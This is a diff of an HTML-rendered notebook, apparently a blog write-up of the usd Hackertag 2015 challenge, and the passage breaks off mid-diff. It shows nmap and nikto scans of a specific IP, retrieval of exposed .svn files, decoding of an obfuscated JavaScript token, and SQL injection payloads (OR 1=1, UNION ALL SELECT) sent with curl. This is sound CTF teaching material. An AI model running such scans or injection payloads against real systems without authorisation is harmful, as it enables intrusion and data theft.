@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -132,12 +132,10 @@
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [122]:
-</div>
-<div class="collapseheader box-flex1"><span style="font-weight: bold;">Expand Code</span>
-<div class="input_area box-flex1" style="display:none">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="kn">import</span> <span class="nn">pandas</span> <span class="kn">as</span> <span class="nn">pd</span>
+<div class="prompt input_prompt">In [122]:</div>
+<div class="collapseheader inner_cell"><span style="font-weight: bold;">Expand Code</span>
+<div class="input_area" style="display:none">
+<div class="highlight-ipynb"><pre class="ipynb"><span></span><span class="kn">import</span> <span class="nn">pandas</span> <span class="kn">as</span> <span class="nn">pd</span>
 <span class="kn">import</span> <span class="nn">sqlite3</span>
 <span class="kn">import</span> <span class="nn">binascii</span>
 </pre></div>
@@ -165,19 +163,19 @@ In [122]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [6]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">%%</span><span class="k">bash</span>
-<span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">T4</span> <span class="mf">82.195</span><span class="o">.</span><span class="mf">79.41</span>
+<div class="prompt input_prompt">In [6]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+nmap -A -T4 82.195.79.41
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">
 Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-18 20:57 CET
 Nmap scan report for 82.195.79.41
@@ -214,18 +212,18 @@ Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [9]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl http://82.195.79.41//no/one/will/ever/know/
+<div class="prompt input_prompt">In [9]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl http://82.195.79.41//no/one/will/ever/know/
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
 &lt;html&gt;
  &lt;head&gt;
@@ -265,18 +263,18 @@ In [9]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [8]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl http://82.195.79.41//no/one/will/ever/know/secret.txt
+<div class="prompt input_prompt">In [8]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl http://82.195.79.41//no/one/will/ever/know/secret.txt
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">Token: 928191
 </pre>
 </div>
@@ -295,18 +293,18 @@ In [8]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [14]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl http://82.195.79.41/~freddy/
+<div class="prompt input_prompt">In [14]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl http://82.195.79.41/~freddy/
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
 &lt;html&gt;
  &lt;head&gt;
@@ -354,18 +352,18 @@ In [14]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [16]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>nikto -host http://82.195.79.41/ -C all
+<div class="prompt input_prompt">In [16]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>nikto -host http://82.195.79.41/ -C all
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          82.195.79.41
@@ -374,12 +372,12 @@ In [16]:
 + Start Time:         2015-03-18 20:07:20 (GMT1)
 ---------------------------------------------------------------------------
 + Server: Apache
-+ Uncommon header &amp;apos;x-frame-options&amp;apos; found, with contents: sameorigin
++ Uncommon header 'x-frame-options' found, with contents: sameorigin
 + Server leaks inodes via ETags, header found with file /robots.txt, inode: 131873, size: 68, mtime: 0x511175d9c5600
 + OSVDB-3268: /no/one/will/ever/know/: Directory indexing found.
-+ File/dir &amp;apos;/no/one/will/ever/know/&amp;apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/no/one/will/ever/know/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
 + OSVDB-3268: /~freddy/: Directory indexing found.
-+ File/dir &amp;apos;/~freddy/&amp;apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/~freddy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
 + "robots.txt" contains 2 entries which should be manually viewed.
 + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
 + OSVDB-3092: /.svn/entries: Subversion Entries file may contain directory listing information.
@@ -405,30 +403,29 @@ In [16]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [6]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="n">con</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s">"wc.db"</span><span class="p">)</span>
+<div class="prompt input_prompt">In [6]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">con</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">"wc.db"</span><span class="p">)</span>
 </pre></div>
+</div>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [8]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="n">pd</span><span class="o">.</span><span class="n">read_sql</span><span class="p">(</span><span class="s">"SELECT local_relpath, checksum FROM NODES"</span><span class="p">,</span> <span class="n">con</span><span class="p">)</span>
+<div class="prompt input_prompt">In [8]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">pd</span><span class="o">.</span><span class="n">read_sql</span><span class="p">(</span><span class="s2">"SELECT local_relpath, checksum FROM NODES"</span><span class="p">,</span> <span class="n">con</span><span class="p">)</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[8]:</div>
-<div class="output_html rendered_html output_subarea output_pyout">
+<div class="output_area"><div class="prompt output_prompt">Out[8]:</div>
+<div class="output_html rendered_html output_subarea output_execute_result">
 <div style="max-height:1000px;max-width:1500px;overflow:auto;">
 <table border="1" class="table table-hover table-striped dataframe">
 <thead>
@@ -468,28 +465,28 @@ In [8]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [9]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl http://82.195.79.41/.svn/pristine/71/71d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
+<div class="prompt input_prompt">In [9]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl http://82.195.79.41/.svn/pristine/71/71d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;?php
 include "src/header.php";
 // Todo: Challenge fuer Token 102342 bauen.
-echo &amp;apos;
+echo '
         &lt;div id="contentliquid"&gt;&lt;div id="content"&gt;
            &lt;p&gt;Die folgende Datei steht zum Download bereit:&lt;/p&gt;
 	&lt;ul&gt;
 	&lt;li&gt;&lt;a href="dl/usd_Hackertag_2015.pdf"&gt;usd Hackertag Poster (PDF-Format)&lt;/a&gt;&lt;/li&gt;
 	&lt;/ul&gt;
-&amp;apos;;
+';
 
 echo "&lt;/div&gt;&lt;/div&gt;";
 include "src/menu.php";
@@ -508,8 +505,7 @@ include "src/footer.php";
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>There is this line:</p>
-<blockquote>
-<p>Todo: Challenge fuer <strong>Token 102342</strong> bauen.</p>
+<blockquote><p>Todo: Challenge fuer <strong>Token 102342</strong> bauen.</p>
 </blockquote>
 </div>
 </div>
@@ -535,18 +531,18 @@ include "src/footer.php";
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [11]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>file usd_Hackertag_2015.pdf
+<div class="prompt input_prompt">In [11]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>file usd_Hackertag_2015.pdf
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">usd_Hackertag_2015.pdf: PDF document, version 1.3
 </pre>
 </div>
@@ -559,7 +555,7 @@ In [11]:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>When you look at it (PDF viewer) nothing special about it. </p>
+<p>When you look at it (PDF viewer) nothing special about it.</p>
 <p><img alt="hackertag" class="img-responsive" src="http://dl.dornea.nu/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png"/></p>
 <p>Let's extract all available strings:</p>
 </div>
@@ -567,19 +563,19 @@ In [11]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [13]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>strings usd_Hackertag_2015.pdf <span class="p">|</span> tail -n <span class="m">20</span>
+<div class="prompt input_prompt">In [13]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>strings usd_Hackertag_2015.pdf <span class="p">|</span> tail -n <span class="m">20</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
-<pre class="ipynb">/ModDate (D:20150220100358+01&amp;apos;00&amp;apos;)
+<div class="output_subarea output_stream output_stdout output_text">
+<pre class="ipynb">/ModDate (D:20150220100358+01'00')
 /Producer (Adobe PDF library 10.01)
 /Title (usd Hackertag 2015)
 /Trapped /False
@@ -629,25 +625,25 @@ startxref
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>Now let's have a look at the main <a href="http://82.195.79.41/">web-page</a>. Somewhere you'll see this line:</p>
-<pre><code>&lt;script type="text/javascript" src="http://82.195.79.41/js/jquery/jquery.js"&gt;&lt;/script&gt;
-</code></pre><p>But wait a sec. JQuery? That sounds suspicious.</p>
+<pre><code>&lt;script type="text/javascript" src="http://82.195.79.41/js/jquery/jquery.js"&gt;&lt;/script&gt;</code></pre>
+<p>But wait a sec. JQuery? That sounds suspicious.</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [17]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl http://82.195.79.41/js/jquery/jquery.js
+<div class="prompt input_prompt">In [17]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl http://82.195.79.41/js/jquery/jquery.js
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">eval(String.fromCharCode(105, 102, 32, 40, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 111, 115, 116, 110, 97, 109, 101, 32, 61, 61, 32, 34, 49, 50, 55, 46, 48, 46, 48, 46, 49, 34, 41, 32, 123, 10, 118, 97, 114, 32, 95, 48, 120, 98, 55, 57, 97, 61, 91, 34, 92, 120, 53, 55, 92, 120, 54, 57, 92, 120, 54, 67, 92, 120, 54, 67, 92, 120, 54, 66, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 55, 65, 92, 120, 55, 53, 92, 120, 55, 50, 92, 120, 70, 67, 92, 120, 54, 51, 92, 120, 54, 66, 92, 120, 50, 48, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 52, 92, 120, 54, 52, 92, 120, 55, 57, 92, 120, 50, 69, 92, 120, 50, 48, 92, 120, 52, 52, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 50, 48, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 54, 56, 92, 120, 54, 53, 92, 120, 54, 57, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 50, 48, 92, 120, 53, 52, 92, 120, 54, 70, 92, 120, 54, 66, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 54, 67, 92, 120, 54, 49, 92, 120, 55, 53, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 51, 65, 92, 120, 50, 48, 92, 120, 51, 52, 92, 120, 51, 49, 92, 120, 51, 55, 92, 120, 51, 56, 92, 120, 51, 53, 92, 120, 51, 53, 34, 93, 59, 97, 108, 101, 114, 116, 40, 95, 48, 120, 98, 55, 57, 97, 91, 48, 93, 41, 59, 10, 125));
 </pre>
 </div>
@@ -657,54 +653,56 @@ In [17]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [40]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="n">char_codes</span> <span class="o">=</span> <span class="err">!</span><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">82.195</span><span class="o">.</span><span class="mf">79.41</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">jquery</span><span class="o">/</span><span class="n">jquery</span><span class="o">.</span><span class="n">js</span>
+<div class="prompt input_prompt">In [40]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">char_codes</span> <span class="o">=</span> <span class="o">!</span>curl http://82.195.79.41/js/jquery/jquery.js
 </pre></div>
+</div>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [41]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Convert char codes to string</span>
-<span class="n">char_codes</span> <span class="o">=</span> <span class="n">char_codes</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">25</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>
-<span class="n">string_message</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">char_codes</span><span class="p">)</span>
+<div class="prompt input_prompt">In [41]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="c1"># Convert char codes to string</span>
+<span class="n">char_codes</span> <span class="o">=</span> <span class="n">char_codes</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">25</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span>
+<span class="n">string_message</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">char_codes</span><span class="p">)</span>
 <span class="n">string_message</span>
 </pre></div>
 </div>
 </div>
+</div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[41]:</div>
-<pre class="ipynb">&amp;apos;if (window.location.hostname == "127.0.0.1") {\nvar _0xb79a=["\\x57\\x69\\x6C\\x6C\\x6B\\x6F\\x6D\\x6D\\x65\\x6E\\x20\\x7A\\x75\\x72\\xFC\\x63\\x6B\\x20\\x66\\x72\\x65\\x64\\x64\\x79\\x2E\\x20\\x44\\x65\\x72\\x20\\x67\\x65\\x68\\x65\\x69\\x6D\\x65\\x20\\x54\\x6F\\x6B\\x65\\x6E\\x20\\x6C\\x61\\x75\\x74\\x65\\x74\\x3A\\x20\\x34\\x31\\x37\\x38\\x35\\x35"];alert(_0xb79a[0]);\n}&amp;apos;</pre>
+<div class="output_area"><div class="prompt output_prompt">Out[41]:</div>
+<div class="output_text output_subarea output_execute_result">
+<pre class="ipynb">'if (window.location.hostname == "127.0.0.1") {\nvar _0xb79a=["\\x57\\x69\\x6C\\x6C\\x6B\\x6F\\x6D\\x6D\\x65\\x6E\\x20\\x7A\\x75\\x72\\xFC\\x63\\x6B\\x20\\x66\\x72\\x65\\x64\\x64\\x79\\x2E\\x20\\x44\\x65\\x72\\x20\\x67\\x65\\x68\\x65\\x69\\x6D\\x65\\x20\\x54\\x6F\\x6B\\x65\\x6E\\x20\\x6C\\x61\\x75\\x74\\x65\\x74\\x3A\\x20\\x34\\x31\\x37\\x38\\x35\\x35"];alert(_0xb79a[0]);\n}'</pre>
+</div>
 </div>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [64]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="c"># Decode hex string to ascii</span>
-<span class="n">hex_code</span> <span class="o">=</span> <span class="n">string_message</span><span class="p">[</span><span class="mi">61</span><span class="p">:</span><span class="o">-</span><span class="mi">23</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+<div class="prompt input_prompt">In [64]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="c1"># Decode hex string to ascii</span>
+<span class="n">hex_code</span> <span class="o">=</span> <span class="n">string_message</span><span class="p">[</span><span class="mi">61</span><span class="p">:</span><span class="o">-</span><span class="mi">23</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="se">\\</span><span class="s1">x'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
 <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">hex_code</span><span class="p">)</span>
 </pre></div>
 </div>
 </div>
+</div>
 <div class="output_wrapper">
 <div class="output">
-<div class="output_area"><div class="prompt output_prompt">
-    Out[64]:</div>
-<pre class="ipynb">b&amp;apos;Willkommen zur\xfcck freddy. Der geheime Token lautet: 417855&amp;apos;</pre>
+<div class="output_area"><div class="prompt output_prompt">Out[64]:</div>
+<div class="output_text output_subarea output_execute_result">
+<pre class="ipynb">b'Willkommen zur\xfcck freddy. Der geheime Token lautet: 417855'</pre>
+</div>
 </div>
 </div>
 </div>
@@ -733,7 +731,7 @@ In [64]:
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>I must say this part of the challenge was the most "challenging" one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.</p>
-<p>There was this link <a href="http://82.195.79.41/liste.php?id=1">http://82.195.79.41/liste.php?id=1</a> which caught my attention from the beginning. </p>
+<p>There was this link <a href="http://82.195.79.41/liste.php?id=1">http://82.195.79.41/liste.php?id=1</a> which caught my attention from the beginning.</p>
 <p><img alt="hackertag" class="img-responsive" src="http://dl.dornea.nu/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png"/></p>
 <p>The first thing I did:</p>
 </div>
@@ -741,19 +739,19 @@ In [64]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [75]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=1'"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
+<div class="prompt input_prompt">In [75]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=1'"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
-<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "&amp;apos;1&amp;apos;&amp;apos;;"</pre>
+<div class="output_subarea output_stream output_stdout output_text">
+<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "'1'';"</pre>
 </div>
 </div>
 </div>
@@ -770,19 +768,19 @@ In [75]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [82]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=1'%20OR 1=1"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
+<div class="prompt input_prompt">In [82]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=1'%20OR 1=1"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">1</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
-<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "&amp;apos;;"</pre>
+<div class="output_subarea output_stream output_stdout output_text">
+<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "';"</pre>
 </div>
 </div>
 </div>
@@ -799,18 +797,18 @@ In [82]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [89]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">20</span>
+<div class="prompt input_prompt">In [89]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a','k';--#"</span> 2&gt; /dev/null <span class="p">|</span> tail -n <span class="m">20</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
+<div class="output_subarea output_stream output_stdout output_text">
 <pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
         &lt;div id="leftcolumn"&gt;
 	&lt;ul&gt;
@@ -843,26 +841,26 @@ In [89]:
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
 <p>Have you noticed this line?</p>
-<pre><code>&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><p><strong>a</strong> and <strong>b</strong> were successfully "merged" into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has <a href="https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection">sth</a> you can use in your tests. But the most useful thing is to test for <em>string concatenation</em> (nice article <a href="http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/">here</a>). So I've tried several things:</p>
+<pre><code>&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/liste.php?id=a"&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;</code></pre>
+<p><strong>a</strong> and <strong>b</strong> were successfully "merged" into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has <a href="https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection">sth</a> you can use in your tests. But the most useful thing is to test for <em>string concatenation</em> (nice article <a href="http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/">here</a>). So I've tried several things:</p>
 </div>
 </div>
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [91]:
-</div>
-<div class="input_area box-flex1">
-<div class="highlight-ipynb"><pre class="ipynb"><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20CONCAT('a', 'b'),'k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
+<div class="prompt input_prompt">In [91]:</div>
+<div class="inner_cell">
+<div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="o">!</span>curl <span class="s2">"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20CONCAT('a', 'b'),'k';--#"</span> 2&gt; /dev/null <span class="p">|</span> grep <span class="s2">"contentliquid"</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="output_wrapper">
 <div class="output">
 <div class="output_area"><div class="prompt"></div>
-<div class="box-flex1 output_subarea output_stream output_stdout">
-<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "&amp;apos;;"
+<div class="output_subarea output_stream output_stdout output_text">
+<pre class="ipynb">&lt;div id="contentliquid"&gt;&lt;div id="content"&gt;unrecognized token: "';"
 </pre>
 </div>
 </div>
@@ -871,18 +869,18 @@ In [91]:
 </div>
 <div class="cell border-box-sizing code_cell rendered">
 <div class="input">
-<div class="prompt input_prompt">
-In [93]:
